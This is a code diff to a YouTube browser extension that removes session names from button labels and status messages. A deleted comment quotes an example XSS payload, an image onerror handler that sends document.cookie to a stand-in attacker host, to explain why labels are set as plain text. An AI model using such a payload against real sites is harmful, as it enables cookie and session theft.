@@ -189,14 +189,7 @@
     btn.classList.remove("stc-yt-error", "stc-yt-success");
     if (state === "error") btn.classList.add("stc-yt-error");
     if (state === "success") btn.classList.add("stc-yt-success");
-    // Build button contents without ever putting `label` into innerHTML.
-    // `label` flows from activeSession.name (chrome.storage, user-controlled
-    // via the popup's session-name input) into this function. Interpolating
-    // it into innerHTML would let a session named e.g.
-    //   <img src=x onerror="fetch('//attacker/'+document.cookie)">
-    // execute script in the YouTube page origin. Build the static chrome
-    // via innerHTML on a throwaway container (constants only), then append
-    // the label as a textContent span.
+    // Only the fixed icon markup uses HTML. Status labels are plain text.
     btn.replaceChildren();
     const chromeWrap = document.createElement("span");
     chromeWrap.style.display = "inline-flex";
@@ -215,7 +208,7 @@
     labelEl.className = LABEL_CLASS;
     labelEl.textContent = label;
     btn.appendChild(labelEl);
-    // A long label (an active session's name) is cut with an ellipsis; the
+    // A long status label is cut with an ellipsis; the
     // full text stays in the tooltip. Later states set their own title.
     btn.title = String(label).length > 24 ? String(label) : "";
   }
@@ -373,7 +366,7 @@
   }
 
   function defaultLabel() {
-    return activeSession ? `Add to session: ${activeSession.name || activeSession.id}` : "Uoink";
+    return activeSession ? "Add to session" : "Uoink";
   }
 
   function refreshDefaultLabel() {
@@ -665,8 +658,7 @@
   }
 
   async function runSessionAdd(btn, url, interval) {
-    const sessionName = activeSession.name || activeSession.id;
-    setButtonState(btn, "working", `Adding to ${sessionName}...`);
+    setButtonState(btn, "working", "Adding to session...");
     const retryOf = takeRetryFailureId();
 
     let data;
@@ -689,7 +681,7 @@
     }
     STC.forgetFailure(retryOf);
 
-    const message = `${sessionName} · ${data.video_count} video${data.video_count === 1 ? "" : "s"} so far. ` +
+    const message = `${data.video_count} video${data.video_count === 1 ? "" : "s"} so far. ` +
       "End the session in the popup to send to Claude or ChatGPT.";
     notify("Added to session", STC.pinnedMessage(data, message));
 
